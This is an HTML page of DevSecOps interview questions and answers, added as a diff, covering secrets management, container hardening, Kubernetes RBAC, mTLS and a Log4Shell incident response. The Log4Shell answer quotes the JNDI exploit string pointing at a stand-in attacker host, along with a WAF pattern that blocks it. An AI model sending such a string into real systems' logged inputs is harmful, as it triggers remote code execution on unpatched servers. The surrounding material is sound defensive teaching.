@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>DevOps Mastery: interview-questions</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel="stylesheet" href="/tmp/devops-style.css" />
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">DevOps Mastery: interview-questions</h1>
+</header>
+<nav id="TOC" role="doc-toc">
+<ul>
+<li><a href="#security-devsecops-interview-questions-answers"
+id="toc-security-devsecops-interview-questions-answers">Security &amp;
+DevSecOps — Interview Questions &amp; Answers</a></li>
+</ul>
+</nav>
+<h1 id="security-devsecops-interview-questions-answers">Security &amp;
+DevSecOps — Interview Questions &amp; Answers</h1>
+<p><strong>Q1: What is the difference between SAST, DAST, and
+SCA?</strong> &gt; - <strong>SAST (Static)</strong>: Analyzes source
+code without executing. Runs at commit/CI time. Finds SQL injection
+patterns, hardcoded secrets, dangerous function calls. Fast, no running
+app needed. High false positive rate. &gt; - <strong>DAST
+(Dynamic)</strong>: Tests running application by sending malicious
+payloads. Finds auth bypasses, XSS, injection that only appears at
+runtime. Slower, needs deployed environment. &gt; - <strong>SCA
+(Software Composition Analysis)</strong>: Scans third-party dependencies
+for known CVEs. Finds “you’re using Log4j 2.14, which has
+CVE-2021-44228.” Runs at CI time against package manifests. &gt; &gt; A
+mature DevSecOps pipeline uses all three at different stages.</p>
+<hr />
+<p><strong>Q2: How do you prevent secret sprawl in a large
+organization?</strong> &gt; 1. <strong>Central secrets
+management</strong>: Vault or AWS Secrets Manager as single source of
+truth &gt; 2. <strong>Eliminate static credentials</strong>: Use dynamic
+secrets (Vault DB engine) and IRSA/Workload Identity &gt; 3.
+<strong>Pre-commit scanning</strong>: gitleaks/detect-secrets hook
+prevents secrets from ever entering VCS &gt; 4. <strong>Secret rotation
+automation</strong>: Vault leases or AWS Secrets Manager auto-rotation
+&gt; 5. <strong>Audit trail</strong>: Every secret access logged; alert
+on anomalous access patterns &gt; 6. <strong>Break-glass
+procedure</strong>: For emergencies — logged, time-limited, reviewed</p>
+<hr />
+<p><strong>Q3: Walk through securing a container from Dockerfile to
+production.</strong> &gt; 1. <strong>Dockerfile</strong>: Minimal base
+(distroless/alpine), run as <code>USER 1001</code>, multi-stage build,
+pin digest not tag &gt; 2. <strong>CI scan</strong>: Trivy on every
+build — fail on CRITICAL CVEs &gt; 3. <strong>Registry</strong>: Private
+registry, image signing with Cosign, SBOM attached &gt; 4. <strong>K8s
+admission</strong>: Kyverno/OPA policy rejects unsigned images or images
+from untrusted registries &gt; 5. <strong>Runtime</strong>: Pod security
+context (<code>readOnlyRootFilesystem</code>,
+<code>allowPrivilegeEscalation: false</code>, drop all capabilities),
+NetworkPolicy restricting egress &gt; 6. <strong>Runtime
+monitoring</strong>: Falco watching for unexpected process execution,
+file writes, network connections &gt; 7. <strong>Continuous</strong>:
+Weekly re-scans of deployed image digests against updated CVE
+database</p>
+<hr />
+<p><strong>Q4: Explain the principle of least privilege and how you
+enforce it in AWS + Kubernetes.</strong> &gt; Give every identity (user,
+service, role) only the minimum permissions needed for its function, and
+nothing more. &gt; &gt; <strong>AWS</strong>: Start with deny-all. Add
+only specific actions on specific resources. Use IAM Access Analyzer to
+find overly permissive policies. Use IRSA instead of node instance
+profiles (pod-level permissions vs node-level). Use SCPs in AWS
+Organizations to set organization-wide maximum permissions. &gt; &gt;
+<strong>Kubernetes</strong>: Create Role/ClusterRole with specific verbs
+(get, list, watch) on specific resources. Never use
+<code>verbs: ["*"]</code>. Service accounts get only what their workload
+needs. Audit with <code>kubectl auth can-i --list</code>. Disable
+ServiceAccount token auto-mounting by default.</p>
+<hr />
+<p><strong>Q5: What is Log4Shell (CVE-2021-44228)? What would you have
+done as a DevOps engineer?</strong> &gt; Log4Shell was a critical RCE
+vulnerability in Log4j 2.x. The
+<code>${jndi:ldap://attacker.com/a}</code> string in any logged input
+triggered a remote class load → remote code execution. CVSS 10.0. &gt;
+&gt; <strong>Immediate response (hours)</strong>: &gt; 1. Run SCA scan
+across all services — find every service using Log4j &gt; 2. Check if
+JNDI is exploitable: WAF rule to block <code>${jndi:</code> patterns at
+perimeter &gt; 3. Set JVM flag
+<code>-Dlog4j2.formatMsgNoLookups=true</code> as immediate mitigation
+&gt; &gt; <strong>Short-term (days)</strong>: &gt; 4. Patch to Log4j
+2.17.1+ across all services &gt; 5. Deploy and rollout via CI/CD
+pipeline &gt; 6. Verify with container re-scan &gt; &gt;
+<strong>Long-term</strong>: &gt; 7. Implement SBOM for all services —
+scan continuously against CVE feed &gt; 8. Set CVE patching SLA
+(critical: 24hrs)</p>
+<hr />
+<p><strong>Q6: What is RBAC in Kubernetes and how does it differ from
+ABAC?</strong> &gt; <strong>RBAC (Role-Based Access Control)</strong>:
+Permissions based on <em>roles</em> assigned to subjects. Subjects are
+users, groups, service accounts. Resources are API objects. Verbs are
+actions. Defined with Role/ClusterRole + RoleBinding/ClusterRoleBinding
+objects. Enabled by default since K8s 1.6. &gt; &gt; <strong>ABAC
+(Attribute-Based Access Control)</strong>: Older K8s mechanism.
+Permissions based on attributes (user, resource, namespace) in a static
+policy file on the API server. Hard to manage, no dynamic updates, not
+recommended.</p>
+<hr />
+<p><strong>Q7: How do you handle a discovered CVE in a base image used
+by 50+ services?</strong> &gt; 1. <strong>Automated detection</strong>:
+Container scanning in CI + scheduled re-scans of deployed images should
+have already alerted &gt; 2. <strong>Assess severity</strong>: CVSS
+score, exploitability, whether affected package is actually used &gt; 3.
+<strong>Triage</strong>: Is this exploitable in our environment? Is a
+patch available? &gt; 4. <strong>Patch</strong>: Update base image in a
+shared Dockerfile or base image repository. All 50 services rebuild
+automatically if using the same base — this is why centralized base
+images matter. &gt; 5. <strong>Emergency if critical</strong>:
+Force-rebuild all images via CI pipeline trigger, deploy within SLA
+window &gt; 6. <strong>Verify</strong>: Re-scan all images post-patch
+&gt; 7. <strong>Process improvement</strong>: Implement image provenance
+— track which base image version each service uses</p>
+<hr />
+<p><strong>Q8: What is mTLS and why is it important in a service
+mesh?</strong> &gt; mTLS (mutual TLS) means both client and server
+present certificates and verify each other — not just the server
+authenticating itself to the client (regular TLS). &gt; &gt; In a
+service mesh (Istio/Linkerd), every pod gets a SPIFFE X.509 certificate
+tied to its Kubernetes Service Account. When service A calls B: &gt; -
+A’s sidecar presents its certificate — B’s sidecar verifies A’s identity
+&gt; - B’s sidecar presents its certificate — A’s sidecar verifies B’s
+identity &gt; - All traffic is encrypted in transit &gt; &gt; This
+prevents: lateral movement after a pod compromise, impersonation
+attacks, traffic interception on the cluster network.</p>
+<hr />
+<p><strong>Q9: What are the OWASP Top 10? Which are most relevant to
+DevOps?</strong> &gt; Most relevant to DevOps pipeline and
+infrastructure: &gt; &gt; - <strong>A05: Security
+Misconfiguration</strong> — default credentials, open S3 buckets,
+unnecessary features enabled. Caught by: tfsec, checkov, AWS Config
+rules &gt; - <strong>A06: Vulnerable and Outdated Components</strong> —
+unpatched libraries. Caught by: Snyk, Trivy, Dependabot &gt; -
+<strong>A02: Cryptographic Failures</strong> — data not encrypted at
+rest/transit. Enforced by: Terraform policy, K8s NetworkPolicy, TLS
+enforcement &gt; - <strong>A04: Insecure Design</strong> — lack of
+threat modeling. Addressed by: security champions, design reviews &gt; -
+<strong>A08: Software and Data Integrity Failures</strong> — unsigned
+images, CI/CD pipeline tampering. Addressed by: Cosign, SLSA, pipeline
+security</p>
+<hr />
+<p><strong>Q10: How do you audit Kubernetes for security
+misconfigurations?</strong> &gt; Tools and checks: &gt; -
+<code>kube-bench</code> — runs CIS Kubernetes Benchmark, checks API
+server flags, etcd encryption, RBAC setup &gt; -
+<code>kube-hunter</code> — active security hunting for exposed
+endpoints, privilege escalation paths &gt; -
+<code>kubectl-who-can</code> — find who has permission to do specific
+actions &gt; - Polaris (Fairwinds) — validates K8s resources against
+best practices &gt; - Checkov on K8s manifests in Git repo &gt; &gt; Key
+things to check: &gt; 1. Are any pods running as root?
+<code>kubectl get pods -A -o json | jq '.items[].spec.containers[].securityContext'</code>
+&gt; 2. Anonymous API access?
+<code>kubectl --as system:anonymous get pods</code> &gt; 3. Dashboard
+exposed publicly? &gt; 4. Any secrets in ConfigMaps? &gt; 5. Etcd
+encrypted at rest? &gt; 6. Audit logs enabled?</p>
+</body>
+</html>
